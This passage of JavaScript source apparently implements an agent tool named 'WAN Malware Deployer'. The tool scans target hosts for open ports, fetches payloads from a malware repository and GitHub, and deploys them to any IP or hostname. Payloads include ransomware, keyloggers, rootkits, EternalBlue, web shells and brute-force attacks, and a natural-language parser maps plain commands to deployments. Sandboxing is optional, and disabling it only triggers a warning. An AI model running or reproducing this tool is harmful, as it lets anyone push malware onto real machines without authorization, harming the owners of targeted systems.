        try {
            // Initialize safety directories
            await ensureSafetyDirectories();
            const warnings = [];
            if (!safety_mode) {
                warnings.push("⚠️ SAFETY MODE DISABLED - Payloads will execute without sandboxing!");
            }
            // Validate timeout
            if (timeout > SAFETY_CONFIG.MAX_EXECUTION_TIME) {
                timeout = SAFETY_CONFIG.MAX_EXECUTION_TIME;
                warnings.push(`Timeout limited to ${SAFETY_CONFIG.MAX_EXECUTION_TIME}ms for safety`);
            }
            // Handle different modes
            switch (mode) {
                case "list_payloads":
                    logger.info("Fetching available payloads from malware repository...");
                    try {
                        const sandbox = await initializeSandbox();
                        const payloads = await sandbox.listAvailablePayloads();
                        return {
                            content: [],
                            structuredContent: {
                                success: true,
                                message: `Found ${payloads.length} available payloads in Docker sandbox`,
                                mode: "list_payloads",
                                available_payloads: payloads.map((p) => ({
                                    name: p.name,
                                    description: p.description,
                                    executables: p.executables,
                                    source: "docker_sandbox",
                                })),
                                safety_warnings: warnings,
                            },
                        };
                    }
                    catch (error) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: `Failed to list payloads: ${error.message}`,
                                mode: "list_payloads",
                                safety_warnings: warnings,
                            },
                        };
                    }
                case "scan_target":
                    if (!target) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target is required for port scanning",
                                mode: "scan_target",
                            },
                        };
                    }
                    const scanResults = await scanTargetPorts(target);
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Port scan completed for ${target}`,
                            mode: "scan_target",
                            target: target,
                            scan_results: scanResults,
                            safety_warnings: warnings,
                        },
                    };
                case "analyze_target":
                    if (!target) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target is required for target analysis",
                                mode: "analyze_target",
                            },
                        };
                    }
                    logger.info(`Performing comprehensive target analysis: ${target}`);
                    const analysis = await analyzeTarget(target);
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Target analysis completed for ${target}`,
                            mode: "analyze_target",
                            target: target,
                            target_analysis: analysis,
                            safety_warnings: warnings,
                        },
                    };
                case "search_repositories":
                    if (!search_query) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Search query is required for repository search",
                                mode: "search_repositories",
                            },
                        };
                    }
                    logger.info(`Searching GitHub repositories: ${search_query}`);
                    const repositories = await searchGitHubRepositories(search_query);
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Found ${repositories.length} potential payload repositories`,
                            mode: "search_repositories",
                            repository_search_results: repositories.map((r) => ({
                                name: r.name,
                                full_name: r.full_name,
                                description: r.description,
                                stars: r.stars,
                                language: r.language,
                                url: r.url,
                                potential_payloads: r.potential_payloads,
                            })),
                            safety_warnings: warnings,
                        },
                    };
                case "clone_repository":
                    if (!repository_url || !repository_name) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Repository URL and name are required for cloning",
                                mode: "clone_repository",
                                safety_warnings: warnings,
                            },
                        };
                    }
                    logger.info(`Cloning additional repository: ${repository_name} from ${repository_url}`);
                    try {
                        const sandbox = await initializeSandbox();
                        const repoPath = await sandbox.cloneAdditionalRepository(repository_url, repository_name);
                        return {
                            content: [],
                            structuredContent: {
                                success: true,
                                message: `Successfully cloned repository: ${repository_name} into sandbox`,
                                mode: "clone_repository",
                                repository_name: repository_name,
                                repository_url: repository_url,
                                repository_path: repoPath,
                                safety_warnings: warnings,
                            },
                        };
                    }
                    catch (error) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: `Failed to clone repository: ${error.message}`,
                                mode: "clone_repository",
                                safety_warnings: warnings,
                            },
                        };
                    }
                case "natural_language":
                    if (!natural_language_command) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Natural language command is required",
                                mode: "natural_language",
                            },
                        };
                    }
                    // Parse natural language command
                    const parsed = parseNaturalLanguageCommand(natural_language_command);
                    if (!parsed.success) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: parsed.error,
                                mode: "natural_language",
                            },
                        };
                    }
                    // Use parsed parameters for deployment
                    return await executeDeployment(parsed.target, parsed.payload_name, parsed.port, timeout, safety_mode, warnings);
                case "command":
                default:
                    if (!target || !payload_name) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target and payload_name are required for command mode",
                                mode: "command",
                            },
                        };
                    }
                    return await executeDeployment(target, payload_name, port, timeout, safety_mode, warnings);
            }
        }
        catch (error) {
            logger.error(`WAN Malware Deployer error: ${error.message}`);
            return {
                content: [],
                structuredContent: {
                    success: false,
                    message: `Deployment failed: ${error.message}`,
                    mode: mode || "command",
                },
            };
        }
    });
}
// Parse natural language commands
function parseNaturalLanguageCommand(command) {
    const lowerCommand = command.toLowerCase();
    // Check for analysis commands
    if (lowerCommand.includes("analyze") ||
        lowerCommand.includes("suggest") ||
        lowerCommand.includes("recommend")) {
        const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
        const hostnameRegex = /\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\b/;
        const targetMatch = command.match(ipRegex) || command.match(hostnameRegex);
        const target = targetMatch ? targetMatch[0] : null;
        if (target) {
            return {
                success: true,
                mode: "analyze_target",
                target: target,
            };
        }
    }
    // Check for search commands
    if (lowerCommand.includes("search") ||
        lowerCommand.includes("find") ||
        lowerCommand.includes("look for")) {
        // Extract search terms
        const searchTerms = command
            .replace(/search|find|look for|repositories?|payloads?/gi, "")
            .trim();
        if (searchTerms) {
            return {
                success: true,
                mode: "search_repositories",
                search_query: searchTerms,
            };
        }
    }
    // Check for list commands
    if (lowerCommand.includes("list") ||
        lowerCommand.includes("show") ||
        lowerCommand.includes("available")) {
        return {
            success: true,
            mode: "list_payloads",
        };
    }
    // Extract target (IP or hostname)
    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
    const hostnameRegex = /\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\b/;
    const targetMatch = command.match(ipRegex) || command.match(hostnameRegex);
    const target = targetMatch ? targetMatch[0] : null;
    // Extract port
    const portMatch = command.match(/port\s+(\d+)|:(\d+)/);
    const port = portMatch ? parseInt(portMatch[1] || portMatch[2]) : null;
    // Extract payload type
    const payloadKeywords = {
        ransomware: "ransomware",
        trojan: "trojan",
        backdoor: "backdoor",
        keylogger: "keylogger",
        rootkit: "rootkit",
        worm: "worm",
        virus: "virus",
        botnet: "botnet",
        spyware: "spyware",
        adware: "adware",
        ssh_bruteforce: "ssh_bruteforce",
        eternalblue: "eternalblue",
        rdp_bruteforce: "rdp_bruteforce",
        web_shell: "web_shell",
        ftp_bruteforce: "ftp_bruteforce",
        windows_persistence: "windows_persistence",
        linux_backdoor: "linux_backdoor",
    };
    let payload_name = null;
    for (const [keyword, payload] of Object.entries(payloadKeywords)) {
        if (lowerCommand.includes(keyword)) {
            payload_name = payload;
            break;
        }
    }
    if (!target) {
        return {
            success: false,
            error: "Could not identify target IP or hostname in command",
        };
    }
    if (!payload_name) {
        return {
            success: false,
            error: "Could not identify payload type in command",
        };
    }
    return {
        success: true,
        mode: "command",
        target: target,
        payload_name: payload_name,
        port: port,
    };
}
// Execute deployment process
async function executeDeployment(target, payload_name, port, timeout, safety_mode, warnings) {
    const startTime = Date.now();
    try {
        // Fetch repository and get payloads
        logger.info(`Fetching payload: ${payload_name}`);
        const repoPath = await fetchMalwareRepo();
        const payloads = await getAvailablePayloads(repoPath);
        // Find requested payload
        const payload = payloads.find((p) => p.name.toLowerCase().includes(payload_name.toLowerCase()));
        if (!payload) {
            return {
                content: [],
                structuredContent: {
                    success: false,
                    message: `Payload '${payload_name}' not found. Available payloads: ${payloads
                        .map((p) => p.name)
                        .join(", ")}`,
                    mode: "command",
                    target: target,
                    available_payloads: payloads.map((p) => ({
                        name: p.name,
                        description: p.description,
                        executables: p.executables,
                    })),
                },
            };
        }
        // Scan for open ports if not specified
        let targetPort = port;
        let scanResults = [];
        if (!targetPort) {
            logger.info(`Scanning target ${target} for open ports...`);
            scanResults = await scanTargetPorts(target);
            if (scanResults.length === 0) {
                return {
                    content: [],
                    structuredContent: {
                        success: false,
                        message: `No open ports found on target ${target}`,
                        mode: "command",
                        target: target,
                        scan_results: scanResults,
                    },
                };
            }
            // Use first open port
            targetPort = scanResults[0].port;
            logger.info(`Using port ${targetPort} for deployment`);
        }
        // Execute payload
        logger.info(`Deploying ${payload.name} to ${target}:${targetPort}`);
        const result = await executePayload(payload, target, targetPort, timeout);
        const executionTime = Date.now() - startTime;
        return {
            content: [],
            structuredContent: {
                success: result.success,
                message: result.success
                    ? `Successfully deployed and executed ${payload.name} on ${target}:${targetPort}`
                    : `Failed to deploy ${payload.name} to ${target}:${targetPort}`,
                mode: "command",
                target: target,
                scan_results: scanResults,
                deployment_result: result.deploymentResult,
                execution_result: result.executionResult,
                deployment_result_legacy: {
                    payload_name: payload.name,
                    success: result.success,
                    stdout: result.stdout,
                    stderr: result.stderr,
                    execution_time: executionTime,
                },
                safety_warnings: warnings,
            },
        };
    }
    catch (error) {
        logger.error(`Deployment execution failed: ${error.message}`);
        return {
            content: [],
            structuredContent: {
                success: false,
                message: `Deployment failed: ${error.message}`,
                mode: "command",
                target: target,
            },
        };
    }
}
